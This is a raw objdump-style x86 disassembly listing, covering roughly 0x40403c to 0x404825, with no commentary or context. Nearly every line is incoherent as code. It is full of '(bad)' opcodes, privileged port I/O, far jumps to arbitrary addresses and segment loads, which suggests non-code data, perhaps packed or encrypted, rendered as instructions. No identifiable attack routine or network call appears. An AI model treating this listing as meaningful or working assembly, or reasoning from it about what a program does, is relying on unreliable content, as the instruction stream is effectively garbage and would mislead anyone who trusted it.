  40403c:	xchg   esi,eax
  40403d:	dec    eax
  40403e:	or     al,0xc3
  404040:	xchg   BYTE PTR ds:0xe8b39266,cl
  404046:	xchg   esp,eax
  404047:	mov    ebp,0xee53b754
  40404c:	loope  0x40403b
  40404e:	lds    eax,FWORD PTR [esi+0x21b4f134]
  404054:	jge    0x404076
  404056:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404057:	mov    es,ebx
  404059:	(bad)  
  40405a:	das    
  40405b:	add    eax,0x2d0fc08c
  404060:	out    dx,al
  404061:	fbld   TBYTE PTR [ebx-0x2552d3d2]
  404067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404068:	mov    esi,DWORD PTR [edi+0x739a3825]
  40406e:	ss test al,0x71
  404071:	pusha  
  404072:	and    eax,0xecd8b534
  404077:	fld    QWORD PTR [ecx+0x380ee299]
  40407d:	xchg   ecx,eax
  40407e:	pop    es
  40407f:	cmp    esi,DWORD PTR [ebx]
  404081:	xchg   esi,eax
  404082:	sub    BYTE PTR [eax+0x46],cl
  404085:	out    0xc5,al
  404087:	ins    DWORD PTR es:[edi],dx
  404088:	frstor [ecx-0x4be68f4f]
  40408e:	or     edx,ecx
  404090:	mov    eax,0x43e6e6f1
  404095:	mov    ah,dl
  404097:	sti    
  404098:	fldenv [edx]
  40409a:	(bad)  
  40409b:	repnz sbb BYTE PTR [edx+eax*2+0x7d225039],ch
  4040a3:	sbb    eax,0xe61303cf
  4040a8:	test   BYTE PTR [esi+0x5d0f7dcb],ah
  4040ae:	cwde   
  4040af:	dec    ebp
  4040b0:	fdivr  DWORD PTR [eax]
  4040b2:	sbb    eax,0xf8ed051b
  4040b7:	xor    bh,BYTE PTR [esi+0x67fad36c]
  4040bd:	lds    esi,FWORD PTR [edi+0x65]
  4040c0:	idiv   DWORD PTR [ebx-0x23]
  4040c3:	js     0x40412c
  4040c5:	xor    cl,0x54
  4040c8:	sbb    DWORD PTR [edi+0x57],edi
  4040cb:	add    al,0x6b
  4040cd:	pushf  
  4040ce:	je     0x4040d0
  4040d0:	cmp    al,0x79
  4040d2:	dec    edi
  4040d3:	sbb    eax,DWORD PTR [esp+ecx*8]
  4040d6:	dec    esp
  4040d7:	jmp    0x32345127
  4040dc:	adc    dh,BYTE PTR [eax]
  4040de:	jecxz  0x4040ed
  4040e0:	dec    edx
  4040e1:	lds    edx,FWORD PTR [ebp+0x766096df]
  4040e7:	pop    esp
  4040e8:	sahf   
  4040e9:	mov    ds:0x7ef38d75,al
  4040ee:	mov    edx,0xcfc4fb6c
  4040f3:	inc    edi
  4040f4:	sub    ch,dh
  4040f6:	or     al,0x55
  4040f8:	jg     0x404171
  4040fa:	jns    0x40407f
  4040fc:	push   es
  4040fd:	pop    eax
  4040fe:	sub    DWORD PTR [esi],ecx
  404100:	(bad)  
  404101:	ss push 0xffffffd9
  404104:	jne    0x40413f
  404106:	sbb    cl,BYTE PTR [ebx+eiz*1]
  404109:	or     ch,BYTE PTR [ecx+0xf8880eb]
  40410f:	jle    0x40417d
  404111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404112:	add    DWORD PTR [ebx+0x2ca76ce9],eax
  404118:	jo     0x40411b
  40411a:	stc    
  40411b:	mov    edi,0x8c0792fb
  404120:	xchg   BYTE PTR ds:0x4789f60d,dh
  404126:	inc    eax
  404127:	push   0xffffffde
  404129:	fwait
  40412a:	xor    BYTE PTR [ecx-0x204533ae],bh
  404130:	xchg   esi,eax
  404131:	sbb    dh,0xed
  404134:	pop    esi
  404135:	dec    edi
  404136:	xor    al,0xbd
  404138:	pop    ecx
  404139:	arpl   sp,si
  40413b:	outs   dx,BYTE PTR ds:[esi]
  40413c:	fwait
  40413d:	mov    ds:0x3f441e54,al
  404142:	and    ebp,0x39
  404145:	stc    
  404146:	cld    
  404147:	in     eax,0xf7
  404149:	or     DWORD PTR fs:[ecx-0x7671d658],ebp
  404150:	add    eax,DWORD PTR [esi]
  404152:	mov    ch,BYTE PTR [edx+0x3a]
  404155:	loopne 0x4041bb
  404157:	das    
  404158:	dec    esp
  404159:	not    BYTE PTR [ebp-0x4106c758]
  40415f:	sub    al,0xec
  404161:	and    al,0xce
  404163:	out    dx,al
  404164:	fwait
  404165:	je     0x404193
  404167:	adc    ebx,eax
  404169:	mov    eax,0x3fb1d361
  40416e:	xor    DWORD PTR [edi+0x7],edi
  404171:	sbb    al,0x1b
  404173:	repz push ebx
  404175:	out    0x1e,eax
  404177:	xchg   BYTE PTR [ecx+0x1c],cl
  40417a:	and    al,BYTE PTR [ebx]
  40417c:	inc    eax
  40417d:	loope  0x4041ca
  40417f:	cmp    ah,BYTE PTR [eax]
  404181:	bound  ecx,QWORD PTR [edx-0x36a4d4e0]
  404187:	fidivr WORD PTR [edx+0x46]
  40418a:	arpl   WORD PTR [ebx+ecx*4-0x7eac64dc],bx
  404191:	fndisi(8087 only) 
  404193:	mov    ds:0xfb561cd7,eax
  404198:	out    dx,al
  404199:	mov    edi,0xe09c7342
  40419e:	ss dec dx
  4041a1:	or     eax,0x108cc076
  4041a6:	loopne 0x4041cb
  4041a8:	call   0x348c:0x95c59927
  4041af:	pop    edi
  4041b0:	push   ebp
  4041b1:	jmp    DWORD PTR [esi]
  4041b3:	jns    0x4041cf
  4041b5:	add    al,0x1c
  4041b7:	xor    bh,BYTE PTR [esi]
  4041b9:	in     al,dx
  4041ba:	mov    ch,0x12
  4041bc:	inc    eax
  4041bd:	loope  0x404161
  4041bf:	or     al,0xc6
  4041c1:	xchg   ebx,eax
  4041c2:	dec    edi
  4041c3:	mov    dl,0x3
  4041c5:	out    dx,al
  4041c6:	push   ss
  4041c7:	or     esi,edi
  4041c9:	or     ebx,edi
  4041cb:	popf   
  4041cc:	jmp    0x404215
  4041ce:	fcom   QWORD PTR [edi+0x5d]
  4041d1:	aaa    
  4041d2:	fld    DWORD PTR [ebx]
  4041d4:	or     al,bl
  4041d6:	add    bh,BYTE PTR [ecx]
  4041d8:	xchg   WORD PTR [edx],sp
  4041db:	pushf  
  4041dc:	aas    
  4041dd:	mov    al,0xfc
  4041df:	(bad)  
  4041e0:	out    dx,eax
  4041e1:	sbb    eax,0xed9b1124
  4041e6:	sbb    eax,esp
  4041e8:	cld    
  4041e9:	lods   al,BYTE PTR ds:[esi]
  4041ea:	or     cl,BYTE PTR [ebx-0x2c]
  4041ed:	inc    esi
  4041ee:	xor    al,0x35
  4041f0:	repz dec esp
  4041f2:	ja     0x4041d4
  4041f4:	sti    
  4041f5:	and    BYTE PTR [esi-0x38],0xb1
  4041f9:	xchg   ebp,eax
  4041fa:	inc    ecx
  4041fb:	mov    ?,WORD PTR [eax]
  4041fd:	dec    edi
  4041fe:	cmp    DWORD PTR [edi-0x5cc60684],ecx
  404204:	ror    DWORD PTR [ecx-0x2f45104e],1
  40420a:	mov    eax,ds:0xb4d6c738
  40420f:	nop
  404210:	adc    eax,0xca0e6e55
  404215:	mov    DWORD PTR [edx+0x4a9ac3e8],ecx
  40421b:	cs inc dx
  40421e:	or     eax,0xc9e7472b
  404223:	in     al,dx
  404224:	xchg   BYTE PTR [edx],al
  404226:	into   
  404227:	leave  
  404228:	sbb    ah,BYTE PTR [edi+0x60707c23]
  40422e:	int3   
  40422f:	pop    edi
  404230:	dec    esi
  404231:	out    0x44,eax
  404233:	push   ecx
  404234:	pop    edi
  404235:	mov    esp,0xb56f7dd5
  40423a:	and    dl,ah
  40423c:	sbb    al,0x53
  40423e:	xchg   DWORD PTR ds:[ebx+0x4b353230],ebx
  404245:	test   eax,0xcd835a9c
  40424a:	in     eax,dx
  40424b:	mov    dl,0xf9
  40424d:	enter  0x1729,0xce
  404251:	and    dh,BYTE PTR [edi]
  404253:	out    0xd3,al
  404255:	push   edi
  404256:	jns    0x40424d
  404258:	pop    edx
  404259:	or     DWORD PTR [eax],0xffffffa9
  40425c:	in     al,0xaf
  40425e:	cmp    ebx,0xffffffde
  404261:	add    al,0x31
  404263:	pop    ebp
  404264:	repz shl eax,1
  404267:	mov    ds:0x8ce7c105,eax
  40426c:	add    eax,0x4b12d81a
  404271:	add    ebx,ecx
  404273:	aam    0xfb
  404275:	lods   eax,DWORD PTR ds:[esi]
  404276:	sahf   
  404277:	and    bl,BYTE PTR [ecx]
  404279:	ret    
  40427a:	out    0xa6,al
  40427c:	mov    ds:0x8ad5d2a2,eax
  404281:	pop    ds
  404282:	imul   esp,DWORD PTR [edi+0x46],0x57ae254
  404289:	into   
  40428a:	xchg   esi,eax
  40428b:	test   DWORD PTR [eax-0x136cc768],ebx
  404291:	xor    al,0xf9
  404293:	xchg   esp,eax
  404294:	jb     0x4042a2
  404296:	loop   0x4042de
  404298:	fisub  WORD PTR [edx]
  40429a:	add    al,0xc2
  40429c:	mov    al,0x24
  40429e:	or     ah,BYTE PTR [ebp-0x6e]
  4042a1:	sti    
  4042a2:	and    eax,ecx
  4042a4:	test   al,0x4e
  4042a6:	(bad)  
  4042a8:	(bad)  
  4042a9:	aad    0x32
  4042ab:	and    BYTE PTR [eax-0x1e],bl
  4042ae:	xor    DWORD PTR ds:0xb3041b54,esi
  4042b4:	cwde   
  4042b5:	or     al,0x5b
  4042b7:	sahf   
  4042b8:	cwde   
  4042b9:	mov    esp,0xe4feb9d1
  4042be:	jg     0x404294
  4042c0:	or     DWORD PTR [eax+edi*4+0x50cd3099],ecx
  4042c7:	xor    edi,0xf245c12
  4042cd:	inc    ebp
  4042ce:	xchg   edx,eax
  4042cf:	mov    esi,0x12aace01
  4042d4:	(bad)  
  4042d5:	push   edx
  4042d6:	mov    esi,0xc8ccd4a3
  4042db:	enter  0x6157,0x91
  4042df:	out    dx,al
  4042e0:	aaa    
  4042e1:	lahf   
  4042e2:	xlat   BYTE PTR ds:[ebx]
  4042e3:	jne    0x40430a
  4042e5:	popa   
  4042e6:	mov    ebx,0xb7d3dd82
  4042eb:	(bad)  
  4042ec:	dec    ebx
  4042ed:	add    DWORD PTR [ecx+0x22],ebx
  4042f0:	xchg   esi,eax
  4042f1:	mov    dh,0xf2
  4042f3:	rol    bh,0xc8
  4042f6:	fcmovnu st,st(7)
  4042f8:	and    DWORD PTR [edx+0x5e],0x47
  4042fc:	sub    DWORD PTR [esi],0x46b3d4a6
  404302:	push   esi
  404303:	test   eax,0x829cce0f
  404308:	xor    DWORD PTR [ebx+0x53],0x3c
  40430c:	fisttp WORD PTR [ebx]
  40430e:	xor    ecx,DWORD PTR [ebp-0x7720ac28]
  404314:	jns    0x404379
  404316:	cmp    ch,BYTE PTR [edx-0x3c]
  404319:	jns    0x4042f6
  40431b:	fwait
  40431c:	lods   al,BYTE PTR ds:[esi]
  40431d:	ins    BYTE PTR es:[edi],dx
  40431e:	sahf   
  40431f:	xchg   esp,eax
  404320:	(bad)  
  404321:	popa   
  404322:	div    BYTE PTR [esi]
  404324:	push   edi
  404325:	cmp    al,0xc3
  404327:	push   0xfffffff0
  404329:	mov    dl,0xb5
  40432b:	mov    dl,0xf9
  40432d:	and    dl,BYTE PTR [edx]
  40432f:	imul   eax,DWORD PTR [eax-0x79631eda],0x41198d38
  404339:	or     al,0x6f
  40433b:	dec    edi
  40433c:	jb     0x4042de
  40433e:	pop    edx
  40433f:	imul   edx,edi,0xfffffff9
  404342:	jo     0x40436a
  404344:	sbb    eax,0xb3faca79
  404349:	(bad)  
  40434a:	rcl    BYTE PTR [edi+ebx*1+0x28],0xe7
  40434f:	mov    esi,0x512ff9ed
  404354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404355:	mov    al,0x9c
  404357:	in     al,0x2a
  404359:	pop    ecx
  40435a:	ror    dl,1
  40435c:	call   0x6f4b:0xbe321898
  404363:	pop    edi
  404364:	push   0xcc4aa97b
  404369:	cdq    
  40436a:	pop    ecx
  40436b:	lock and edi,DWORD PTR [eax]
  40436e:	pop    edx
  40436f:	les    ecx,FWORD PTR [edx+0x7ea2b9ab]
  404375:	into   
  404376:	jno    0x40434c
  404378:	mov    bh,0xed
  40437a:	idiv   DWORD PTR [edx]
  40437c:	stos   DWORD PTR es:[edi],eax
  40437d:	mov    eax,ds:0x64eabbfe
  404382:	jmp    0x4043cb
  404384:	xchg   esp,eax
  404385:	pop    ss
  404386:	inc    eax
  404387:	dec    ecx
  404388:	cmc    
  404389:	inc    esp
  40438a:	inc    esi
  40438b:	ret    0x5aa8
  40438e:	xor    al,0x79
  404390:	push   edi
  404391:	pop    eax
  404392:	xchg   ebp,eax
  404393:	push   cs
  404394:	hlt    
  404395:	call   0xd2a49f02
  40439a:	mov    esi,0xe32bc51b
  40439f:	add    ebp,DWORD PTR [ebx]
  4043a1:	jmp    0x41a6:0xcc78b2bc
  4043a8:	push   0x98d56d91
  4043ad:	outs   dx,DWORD PTR ds:[esi]
  4043ae:	xor    al,0x73
  4043b0:	aas    
  4043b1:	(bad)  
  4043b2:	test   al,0xb4
  4043b4:	pop    es
  4043b5:	int    0x87
  4043b7:	in     eax,dx
  4043b8:	icebp  
  4043b9:	xchg   esp,eax
  4043ba:	adc    BYTE PTR ds:[edi-0x1a],ah
  4043be:	push   es
  4043bf:	mov    ecx,0xda676cd2
  4043c4:	mov    bl,0xa4
  4043c6:	push   edx
  4043c7:	jnp    0x404375
  4043c9:	aas    
  4043ca:	and    eax,0xf52aa3b9
  4043cf:	cmp    ch,BYTE PTR [ebx-0xfe218c1]
  4043d5:	jnp    0x40441a
  4043d7:	mov    WORD PTR [esi+edi*4+0x36],es
  4043db:	xchg   edx,edx
  4043dd:	jo     0x404367
  4043df:	out    0xe4,al
  4043e1:	inc    edx
  4043e2:	jb     0x404385
  4043e4:	rcpps  xmm1,XMMWORD PTR [esi+0x42f388ea]
  4043eb:	repnz loope 0x4043b2
  4043ee:	call   FWORD PTR [edi-0x4675e7ac]
  4043f4:	add    BYTE PTR [ebp+0x45],bl
  4043f7:	and    ah,BYTE PTR [ecx+0x5a]
  4043fa:	cli    
  4043fb:	mov    al,0xbe
  4043fd:	jmp    0xd49d1d82
  404402:	ret    0xa792
  404405:	xchg   edi,eax
  404406:	mov    eax,ds:0x7d3c9542
  40440b:	sbb    DWORD PTR [esi-0xbc3c681],edx
  404411:	loope  0x404416
  404413:	rcr    DWORD PTR [esi-0x25f6c686],0x1a
  40441a:	clc    
  40441b:	cmp    esi,DWORD PTR [ebx-0x15eefa3f]
  404421:	jmp    0x76ea07f5
  404426:	hlt    
  404427:	fst    DWORD PTR [eax+ebx*1]
  40442a:	pop    edi
  40442b:	psadbw mm7,QWORD PTR [esi+0xa]
  40442f:	leave  
  404430:	scas   al,BYTE PTR es:[edi]
  404431:	push   eax
  404432:	retf   
  404433:	mov    esp,DWORD PTR [eax+0x7d121202]
  404439:	sti    
  40443a:	icebp  
  40443b:	sub    DWORD PTR [esi-0x5f],edi
  40443e:	sbb    bl,dl
  404440:	add    al,0x24
  404442:	mov    edi,DWORD PTR [edi-0x735b6fb2]
  404448:	js     0x4043cf
  40444a:	jge    0x404498
  40444c:	mov    esp,DWORD PTR [ebp-0x6fa0806c]
  404452:	or     BYTE PTR [ebp+0x845df18],bl
  404458:	int3   
  404459:	mov    dh,0xd5
  40445b:	test   ebx,ebx
  40445d:	add    BYTE PTR [edi+0x2f56aea4],0xa2
  404464:	mov    DWORD PTR [ecx],ecx
  404466:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404467:	mov    ebp,DWORD PTR [edx+0x2cbbea27]
  40446d:	xor    DWORD PTR [esi+0x44ef5d88],0x9859adf8
  404477:	inc    ebx
  404478:	sbb    al,0xd8
  40447a:	in     eax,dx
  40447b:	js     0x40447f
  40447d:	push   ebx
  40447e:	mov    esi,0x1da2b7f8
  404483:	add    DWORD PTR [eax-0x1502e4b2],ecx
  404489:	rcr    ch,cl
  40448b:	in     al,0x8b
  40448d:	daa    
  40448e:	inc    ebx
  40448f:	lods   al,BYTE PTR ds:[esi]
  404490:	iret   
  404491:	in     al,0x59
  404493:	cli    
  404494:	push   esi
  404495:	pop    ebx
  404496:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404497:	or     DWORD PTR [esi-0x7],edi
  40449a:	ret    0xb1e5
  40449d:	jmp    0x4044a1
  40449f:	add    DWORD PTR [ecx],ebp
  4044a1:	xchg   esi,eax
  4044a2:	and    bl,BYTE PTR [edx]
  4044a4:	mov    cl,0xd6
  4044a6:	mov    BYTE PTR ds:0x79e45950,al
  4044ac:	ds popa 
  4044ae:	mov    eax,0xb1e3d9fa
  4044b3:	(bad)  
  4044b4:	sub    DWORD PTR [ebx-0x3e],edi
  4044b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044b8:	mov    gs,ebx
  4044ba:	pop    edi
  4044bb:	push   0xffffff81
  4044bd:	(bad)  
  4044be:	xor    eax,0x2c8b7f9f
  4044c3:	inc    edx
  4044c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044c5:	add    DWORD PTR [esi-0x43],eax
  4044c8:	mov    dh,0x98
  4044ca:	jne    0x404510
  4044cc:	cmp    DWORD PTR [ecx],esp
  4044ce:	xor    BYTE PTR [edi],dl
  4044d0:	js     0x4044f7
  4044d2:	xchg   DWORD PTR [eax-0x7532bc6a],ebx
  4044d8:	pop    DWORD PTR [ebx]
  4044da:	add    esp,ecx
  4044dc:	jae    0x404544
  4044de:	sbb    BYTE PTR [eax+edx*1-0x476effe3],bh
  4044e5:	les    ebx,FWORD PTR ds:0xf5081a1e
  4044eb:	ret    
  4044ec:	ss jns 0x404479
  4044ef:	xor    BYTE PTR [edx+0x4794873c],dh
  4044f5:	sub    ebp,esp
  4044f7:	in     al,dx
  4044f8:	xor    dh,BYTE PTR [esi]
  4044fa:	or     bl,BYTE PTR [ecx]
  4044fc:	popf   
  4044fd:	(bad)  
  4044fe:	mov    ch,0x22
  404500:	pushf  
  404501:	mov    dh,0xe5
  404503:	idiv   BYTE PTR [ecx+0xa]
  404506:	mov    al,0xeb
  404508:	jle    0x4044fc
  40450a:	push   es
  40450b:	fisttp WORD PTR [ebx+0x7a]
  40450e:	outs   dx,DWORD PTR ds:[esi]
  40450f:	rol    BYTE PTR [ecx+0x4091572e],1
  404515:	xchg   esp,eax
  404516:	rcl    ch,cl
  404518:	add    al,0xd8
  40451a:	ds xor ebx,ebp
  40451d:	jmp    0x4044c3
  40451f:	test   DWORD PTR [esi+0x13bd2097],esp
  404525:	mov    dh,0x6b
  404527:	xchg   edi,eax
  404528:	(bad)  
  404529:	loop   0x40450c
  40452b:	clc    
  40452c:	adc    DWORD PTR [ebp*4+0x5102f394],eax
  404533:	mov    dl,0x1b
  404535:	sbb    al,0x6d
  404537:	addr16 jb 0x404547
  40453a:	mov    ebp,0x1930aca7
  40453f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404540:	xor    al,0xaf
  404542:	mov    al,0xa2
  404544:	call   0x10d5055c
  404549:	ror    DWORD PTR [edi-0x11],0x9f
  40454d:	sub    eax,eax
  40454f:	(bad)  
  404550:	mov    eax,0x5095bf8a
  404555:	cmp    BYTE PTR [ebp-0x65],0xfe
  404559:	sbb    ebx,DWORD PTR [eax+0x5f9c5d28]
  40455f:	and    DWORD PTR [ecx-0x73e63621],ebp
  404565:	shr    BYTE PTR [esi],0x52
  404568:	ja     0x404529
  40456a:	cmp    eax,0xe19a471f
  40456f:	jns    0x4045dc
  404571:	ret    0x1eac
  404574:	add    bl,ah
  404576:	xor    eax,0x8a49a81c
  40457b:	loopne 0x404570
  40457d:	cdq    
  40457e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40457f:	cmp    DWORD PTR [ebx-0x4c],eax
  404582:	xchg   edx,esp
  404584:	ret    
  404585:	js     0x40455c
  404587:	imul   BYTE PTR [ecx+0x2a]
  40458a:	jno    0x4045f4
  40458c:	and    BYTE PTR [eax],bl
  40458e:	sub    cl,0xb6
  404591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404592:	xchg   ebx,eax
  404593:	mov    edx,0x52cfc2eb
  404598:	mov    bl,0x85
  40459a:	ret    0xe6db
  40459d:	scas   eax,DWORD PTR es:[edi]
  40459e:	ret    0x7afc
  4045a1:	fadd   DWORD PTR [esi+0x7]
  4045a4:	push   ds
  4045a5:	and    DWORD PTR [edi+0x392488c9],esp
  4045ab:	xchg   esp,eax
  4045ac:	aad    0x1a
  4045ae:	sub    esi,ecx
  4045b0:	pop    ebp
  4045b1:	repz gs call 0x62d0af22
  4045b8:	push   eax
  4045b9:	fidiv  DWORD PTR [edx]
  4045bb:	ins    DWORD PTR es:[edi],dx
  4045bc:	jno    0x4045d8
  4045be:	and    DWORD PTR [ecx],0x62f2101
  4045c4:	and    al,0xaf
  4045c6:	int3   
  4045c7:	ins    BYTE PTR es:[edi],dx
  4045c8:	outs   dx,BYTE PTR ds:[esi]
  4045c9:	stc    
  4045ca:	pop    es
  4045cb:	daa    
  4045cc:	sub    esp,esp
  4045ce:	xchg   BYTE PTR [edi-0x550bb2e7],bl
  4045d4:	dec    esi
  4045d5:	dec    esp
  4045d6:	aad    0xdc
  4045d8:	hlt    
  4045d9:	lea    ebx,[eax+esi*1-0x7aeefe96]
  4045e0:	ficom  DWORD PTR [edx+0x17]
  4045e3:	shr    DWORD PTR [eax],1
  4045e5:	aaa    
  4045e6:	mov    esi,0x9eef546d
  4045eb:	cmp    DWORD PTR [ebx],ebp
  4045ed:	sbb    al,0x17
  4045ef:	mov    edi,0x4711e701
  4045f4:	jns    0x40465f
  4045f6:	mov    al,ds:0x3841fbd5
  4045fb:	ror    BYTE PTR [eax+0x7503e9e4],0x52
  404602:	push   esp
  404603:	or     al,0x82
  404605:	addr16 aad 0xf0
  404608:	inc    ebp
  404609:	cmp    edx,DWORD PTR [esi+eax*4+0x68fe42e6]
  404610:	add    BYTE PTR [ecx-0x190ce756],al
  404616:	jp     0x404650
  404618:	test   DWORD PTR [edx+0x55],ecx
  40461b:	jno    0x404639
  40461d:	popa   
  40461e:	mov    ch,0xb4
  404620:	aam    0x1d
  404622:	jne    0x404676
  404624:	adc    eax,0xe81e0e74
  404629:	xor    eax,0xea0b37f9
  40462e:	mov    bl,0x46
  404630:	push   ds
  404631:	repnz in al,0x8a
  404634:	cdq    
  404635:	dec    esi
  404636:	pop    esp
  404637:	xchg   esp,eax
  404638:	icebp  
  404639:	shl    BYTE PTR ds:0xd4062093,cl
  40463f:	inc    ecx
  404640:	inc    ebx
  404641:	xchg   ecx,eax
  404642:	xchg   ebp,eax
  404643:	jge    0x404659
  404645:	xchg   esp,eax
  404646:	pop    edx
  404647:	shr    dl,cl
  404649:	dec    edi
  40464a:	cmp    BYTE PTR [edi+0x18],0x5b
  40464e:	(bad)  
  40464f:	aad    0x75
  404651:	push   edi
  404652:	xchg   esi,eax
  404653:	inc    eax
  404654:	sub    DWORD PTR [esi-0x7cf28f1],ebx
  40465a:	mov    eax,0xab7ffad8
  40465f:	out    0x53,eax
  404661:	nop
  404662:	sub    BYTE PTR [ecx-0x307e24c5],al
  404668:	jno    0x40460a
  40466a:	mov    es,edx
  40466c:	(bad)  
  40466d:	(bad)  
  40466e:	stc    
  40466f:	pushf  
  404670:	push   cs
  404671:	push   es
  404672:	and    BYTE PTR [si],dh
  404675:	and    eax,0x38eddd50
  40467a:	inc    BYTE PTR [eax-0x21]
  40467d:	mov    esi,0x6ad70a27
  404682:	outs   dx,BYTE PTR ds:[esi]
  404683:	inc    esi
  404684:	push   ebx
  404685:	and    eax,0xbcc99d6b
  40468a:	push   ebx
  40468b:	bound  esp,QWORD PTR [edi-0x4462f1ec]
  404691:	mov    bh,0x45
  404693:	xchg   esi,eax
  404694:	outs   dx,DWORD PTR ds:[esi]
  404695:	and    esp,DWORD PTR [ecx+0x2]
  404698:	test   al,0xbb
  40469a:	popa   
  40469b:	push   ebp
  40469c:	mov    dh,0x6e
  40469e:	mov    dh,0xd1
  4046a0:	mov    al,ds:0xe73e75ee
  4046a5:	dec    edx
  4046a6:	std    
  4046a7:	inc    edx
  4046a8:	add    al,0x31
  4046aa:	mov    WORD PTR [esi],fs
  4046ac:	mov    bl,BYTE PTR [ebp+0xcee2b20]
  4046b2:	mov    ch,0xa2
  4046b4:	adc    eax,0x9811f20
  4046b9:	xchg   ebp,eax
  4046ba:	nop
  4046bb:	pop    ebp
  4046bc:	test   eax,0x75f3de7a
  4046c1:	mov    ds:0x36a3a2c9,eax
  4046c6:	fwait
  4046c7:	fwait
  4046c8:	sub    eax,0xcd560ec4
  4046cd:	xor    eax,0xa5391cef
  4046d2:	and    esp,0x65
  4046d5:	fild   QWORD PTR [eax+0x48ed971]
  4046db:	fstp   QWORD PTR gs:[edx-0x54ffcc]
  4046e2:	into   
  4046e3:	cmp    cl,cl
  4046e5:	fs inc ecx
  4046e7:	ins    DWORD PTR es:[edi],dx
  4046e8:	push   es
  4046e9:	loop   0x40469a
  4046eb:	sbb    al,0x53
  4046ed:	xor    BYTE PTR ds:0x69548cd5,dl
  4046f3:	xchg   edx,eax
  4046f4:	xor    al,dh
  4046f6:	push   cs
  4046f7:	jecxz  0x404693
  4046f9:	aaa    
  4046fa:	xor    BYTE PTR [ecx],dl
  4046fc:	retf   0x3b14
  4046ff:	repz in al,0xae
  404702:	stos   DWORD PTR es:[edi],eax
  404703:	sbb    ebp,DWORD PTR [ebx-0x56]
  404706:	mov    ds:0xbd71eb24,al
  40470b:	pop    ecx
  40470c:	lahf   
  40470d:	push   ebx
  40470e:	fdivr  QWORD PTR [eax]
  404710:	xchg   ebp,eax
  404711:	out    dx,al
  404712:	cmp    DWORD PTR [edx+edx*2],ebx
  404715:	mov    DWORD PTR [edx],esi
  404717:	pop    eax
  404718:	xchg   ebx,eax
  404719:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40471a:	cmp    cl,ah
  40471c:	fcmovb st,st(6)
  40471e:	sub    al,0x45
  404720:	arpl   WORD PTR [ecx+ecx*8-0x60],bx
  404724:	cli    
  404725:	out    dx,al
  404726:	push   DWORD PTR [edi+0x0]
  404729:	stos   DWORD PTR es:[edi],eax
  40472a:	mov    ebx,DWORD PTR [edx+eiz*1-0x76]
  40472e:	xor    esp,DWORD PTR [esp+esi*1-0xf]
  404732:	sbb    ebp,edx
  404734:	mov    dh,0x34
  404736:	into   
  404737:	sbb    BYTE PTR [ebp-0x7590fc32],al
  40473d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40473e:	mov    WORD PTR [esi+0x64],?
  404741:	aad    0x3e
  404743:	loope  0x4047be
  404745:	push   esp
  404746:	jmp    0xa4dee1e9
  40474b:	stos   DWORD PTR es:[edi],eax
  40474c:	jb     0x4046fc
  40474e:	clc    
  40474f:	cs xchg ecx,eax
  404751:	inc    edx
  404752:	mov    edi,0x419fcfe9
  404757:	sub    BYTE PTR [ebp-0x68],bh
  40475a:	popa   
  40475b:	ret    
  40475c:	(bad)  
  40475d:	leave  
  40475e:	or     BYTE PTR [edi+eiz*2-0x50b1d78e],ah
  404765:	cs sbb al,0x7b
  404768:	test   ecx,0x851c2f17
  40476e:	mov    esp,0xce21856a
  404773:	das    
  404774:	mov    ds:0x366dde92,al
  404779:	leave  
  40477a:	pop    esi
  40477b:	sub    BYTE PTR [ecx+edi*1+0xf],ch
  40477f:	repnz daa 
  404781:	fadd   st(3),st
  404783:	inc    edi
  404784:	and    bl,al
  404786:	repnz daa 
  404788:	sub    eax,0x71b35106
  40478d:	xor    al,0xf0
  40478f:	mov    BYTE PTR [edi-0x7d],cl
  404792:	out    dx,eax
  404793:	pop    es
  404794:	sbb    al,0x60
  404796:	inc    ebx
  404797:	adc    ebp,ebp
  404799:	cmc    
  40479a:	and    eax,DWORD PTR [esi]
  40479c:	pop    edx
  40479d:	jle    0x4047eb
  40479f:	xchg   esi,eax
  4047a0:	adc    BYTE PTR [edx-0x571d653e],al
  4047a6:	dec    esp
  4047a7:	jle    0x404826
  4047a9:	gs add eax,0x4f76a5f8
  4047af:	js     0x404784
  4047b1:	mov    dh,0x74
  4047b3:	jns    0x40475d
  4047b5:	push   esp
  4047b6:	and    DWORD PTR [edx],eax
  4047b8:	push   ss
  4047b9:	ins    DWORD PTR es:[edi],dx
  4047ba:	sbb    DWORD PTR [ecx+0x7b],0xa77f7add
  4047c1:	(bad)  
  4047c2:	xchg   edi,eax
  4047c3:	pop    ds
  4047c4:	push   es
  4047c5:	xor    edx,DWORD PTR [edi-0x29bcbaa7]
  4047cb:	in     al,dx
  4047cc:	in     al,dx
  4047cd:	sub    DWORD PTR [esi-0x5eb3a5b6],ebx
  4047d3:	(bad)  
  4047d4:	in     al,0x66
  4047d6:	jno    0x4047db
  4047d8:	mov    dl,0x55
  4047da:	or     al,0x15
  4047dc:	push   ds
  4047dd:	shl    DWORD PTR [esi],0x22
  4047e0:	test   DWORD PTR [ecx+ebx*2+0x400747e7],eax
  4047e7:	gs cld 
  4047e9:	inc    edi
  4047ea:	aaa    
  4047eb:	xor    eax,0xf82794fd
  4047f0:	push   ss
  4047f1:	adc    DWORD PTR [ebx-0x71f8e441],ebp
  4047f7:	pop    edi
  4047f8:	cmp    eax,0xbe1ff27a
  4047fd:	mov    BYTE PTR [edx],bh
  4047ff:	add    DWORD PTR [edi],0xb4f5580f
  404805:	test   al,0xc7
  404807:	pop    ebx
  404808:	add    edx,DWORD PTR [eax]
  40480a:	inc    eax
  40480b:	add    al,0x15
  40480d:	or     al,0x3a
  40480f:	hlt    
  404810:	lock xchg BYTE PTR [ebp-0x7c662c9a],ch
  404817:	jl     0x4047e5
  404819:	mov    ecx,0x734235cb
  40481e:	das    
  40481f:	jae    0x404802
  404821:	repz pop ds
  404823:	jle    0x404847
  404825:	sub    eax,0x63d912c
